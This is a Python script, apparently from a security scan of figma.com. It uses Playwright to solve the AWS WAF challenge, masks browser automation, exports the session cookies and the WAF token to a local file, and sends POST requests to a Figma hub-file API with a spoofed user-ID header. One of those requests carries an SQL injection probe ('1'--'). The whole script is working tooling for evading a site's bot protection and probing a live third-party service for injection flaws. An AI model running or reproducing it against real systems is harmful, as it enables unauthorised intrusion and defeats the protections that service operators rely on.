# -*- coding: utf-8 -*-
# q87: Playwright 过 AWS WAF Challenge -> 新鲜 aws-waf-token -> 导出 cookie -> requests 验证
import sys, io, time, json
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
from playwright.sync_api import sync_playwright

BASE = 'https://www.figma.com'
UID_A = '1666382703778278399'
HUB = '1633508841091684550'
COOK = r'D:\scan\figma_report\_waf_cookies_new.txt'
OUT = r'D:\scan\figma_report\_waf_cookies_v2.txt'

def log(m):
    print(m, flush=True)

old = io.open(COOK, encoding='utf-8', errors='replace').read().strip()
pairs = []
for c in old.split(';'):
    if '=' in c:
        k, v = c.split('=', 1)
        pairs.append((k.strip(), v.strip()))
log(f'old cookies: {len(pairs)}')

def run(headless):
    with sync_playwright() as p:
        try:
            browser = p.chromium.launch(channel='chrome', headless=headless,
                                        args=['--disable-blink-features=AutomationControlled'])
            log('launched local chrome')
        except Exception as e:
            log(f'chrome channel failed: {repr(e)[:150]}')
            browser = p.chromium.launch(headless=headless,
                                        args=['--disable-blink-features=AutomationControlled'])
            log('launched bundled chromium')
        ctx = browser.new_context(locale='en-US', viewport={'width': 1366, 'height': 900})
        ck = [{'name': k, 'value': v, 'url': BASE} for k, v in pairs if k != 'aws-waf-token']
        try:
            ctx.add_cookies(ck)
        except Exception as e:
            log(f'add_cookies partial: {repr(e)[:120]}')
        page = ctx.new_page()
        page.goto(f'{BASE}/community/file/{HUB}', wait_until='domcontentloaded', timeout=90000)
        log('page domcontentloaded, polling token...')
        token = None
        for i in range(45):
            for c in ctx.cookies():
                if c['name'] == 'aws-waf-token':
                    token = c
                    break
            if token:
                break
            time.sleep(1)
        log(f'aws-waf-token: {"YES len=" + str(len(token["value"])) if token else "NO"}')
        time.sleep(4)
        try:
            log(f'page title: {page.title()[:90]}')
        except Exception as e:
            log(f'title err {repr(e)[:80]}')
        js = """
        (async () => {
          const out = {};
          try {
            const r = await fetch('/api/hub_files/HUBX/template_canvas', {
              method: 'POST', credentials: 'include',
              headers: {'Content-Type': 'application/json', 'X-Figma-User-ID': 'UIDX'},
              body: JSON.stringify({fv: 1})
            });
            out.a_fv1 = [r.status, (await r.text()).slice(0, 160)];
          } catch (e) { out.a_fv1 = ['EXC', String(e)]; }
          try {
            const r2 = await fetch('/api/hub_files/HUBX/template_canvas', {
              method: 'POST', credentials: 'include',
              headers: {'Content-Type': 'application/json', 'X-Figma-User-ID': 'UIDX'},
              body: JSON.stringify({fv: "1'--"})
            });
            out.b_sqli = [r2.status, (await r2.text()).slice(0, 160)];
          } catch (e) { out.b_sqli = ['EXC', String(e)]; }
          return out;
        })()
        """.replace('HUBX', HUB).replace('UIDX', UID_A)
        try:
            res = page.evaluate(js)
            log('in-browser fetch: ' + json.dumps(res)[:520])
        except Exception as e:
            log(f'evaluate failed: {repr(e)[:120]}')
        try:
            ua = page.evaluate('navigator.userAgent')
        except Exception:
            ua = ''
        log(f'browser UA: {ua}')
        allc = ctx.cookies()
        blob = '; '.join(f"{c['name']}={c['value']}" for c in allc)
        io.open(OUT, 'w', encoding='utf-8').write(blob)
        log(f'exported {len(allc)} cookies -> _waf_cookies_v2.txt ({len(blob)} bytes)')
        browser.close()
        return blob, ua, token

blob, ua, token = run(True)
if not token:
    log('=== headless got no token, retry headed ===')
    blob, ua, token = run(False)

if token:
    H = {'User-Agent': ua, 'X-Figma-User-ID': UID_A, 'Origin': BASE, 'Referer': f'{BASE}/',
         'Cookie': blob, 'Accept': 'application/json', 'Content-Type': 'application/json'}
    for tag, body in (('R1_fv1', {'fv': 1}), ('R2_sqli', {'fv': "1'--"})):
        try:
            r = requests.post(f'{BASE}/api/hub_files/{HUB}/template_canvas', json=body,
                              headers=H, timeout=30)
            ct = r.headers.get('Content-Type', '')[:32]
            log(f'[requests {tag}] {r.status_code} len={len(r.content)} ct={ct} body={r.content[:130]!r}')
        except Exception as e:
            log(f'[requests {tag}] EXC {repr(e)[:110]}')
        time.sleep(2)
log('DONE q87')
